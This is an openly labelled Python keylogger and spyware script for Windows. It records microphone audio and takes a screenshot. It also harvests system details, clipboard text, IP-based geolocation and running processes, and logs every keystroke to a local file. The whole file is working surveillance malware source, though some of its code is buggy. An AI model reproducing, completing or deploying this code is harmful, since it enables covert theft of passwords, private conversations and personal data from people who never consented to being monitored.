from pynput import keyboard
import json

# screenshot
from PIL import ImageGrab

# sound recording
from scipy.io.wavfile import write
import sounddevice as sd
import wavio as wv

# Gather clipboard contents
import win32clipboard

# system information
import socket
import platform

# Geo_location
import requests

# application information
import psutil

# key record

key_list = []
x = False
key_strokes = ""

screenshot_information = "screenshot{}.png"

recording = "recording.wav"
freq = 44100
duration = 10


# sound recording

recording = sd.rec(int(duration * freq), samplerate=freq, channels=2)
sd.wait()

write("recording0.wav", freq, recording)
wv.write("recording1.wav", recording, freq, sampwidth=2)


# screenshot

def screenshot():
    
    im = ImageGrab.grab()
    im.save("screenshot{}.png")

screenshot()

# System information

system_information = "system_info.txt" 
def computer_information():
    with open("system_info.txt", "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)

        f.write("Processor: " + platform.processor() + "\n")
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("IP Address: " + IPAddr + "\n")

computer_information()



# Gather clipboard contents

win32clipboard.OpenClipboard()
data = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
win32clipboard.CloseClipboard()

with open('clipboard_information.txt', 'w') as f:
    f.write(data.decode('utf-8'))


# Geo_location

def get_ip():
    responce = requests.get('https://api64.ipify.org?format=json').json()
    return responce["ip"]

def get_location():
    ip_address = get_ip()
    response = requests.get(f'https://ipapi.co/{ip_address}/json/').json()
    location_data = {
        "ip": ip_address,
        "city": response.get("city"),
        "region": response.get("region"),
        "country": response.get("country_name")
    }
    return location_data

print(get_location())


# application informaton

with open('app_info.txt', 'a') as f:
    for proc in psutil.process_iter(['pid', 'name', 'username']):
        try:
            process_info = proc.as_dict(attrs=['pid', 'name', 'username'])
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
        else:
            print(process_info, file=f)
            

# key recorder

def update_txt_file(key):
    with open('log.txt', 'w+') as key_strokes:
        key_strokes.write(key)

def on_press(key):
    global x, key_list
    if x == False:
        key_list.append(
            {'pressed': f'(key)'}
        )
        x = True
    if x == True:
        key_list.append(
            {'Held': f'(key)'}
        )

def on_release(key):
    global x, key_list,key_strokes
    key_list.append(
        {'Release': f'(key)'}
    )
    if x == True:
        x = False

    key_strokes=key_strokes+str(key)
    update_txt_file(str(key_strokes))

print("(+) Running Keylogger Successfully!\n(!) Saving the key strokes")

with keyboard.Listener(
    on_press=on_press,
    on_release=on_release) as listener:
    listener.join()




    


